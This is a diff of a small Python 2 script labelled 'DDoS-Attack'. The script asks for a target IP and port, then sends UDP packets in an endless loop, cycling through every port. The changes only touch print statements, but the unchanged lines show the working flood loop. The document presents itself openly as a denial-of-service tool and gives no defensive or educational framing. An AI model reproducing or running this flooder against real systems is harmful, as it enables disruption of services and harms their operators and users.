@@ -21,10 +21,9 @@ print
 print "Kodlayan  : Mansur"
 print "Github    : https://github.com/mansur47"
 print "Instagram : https://instagram.com/mansur.sec"
-
+print
 os.system("clear")
 os.system("figlet DDoS-Attack")
-
 
 ip = raw_input("Hedef IP : ")
 port = input("Port       : ")
@@ -46,6 +45,6 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "%s paket %s e yollanmistir port:%s"%(ip,port) 
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
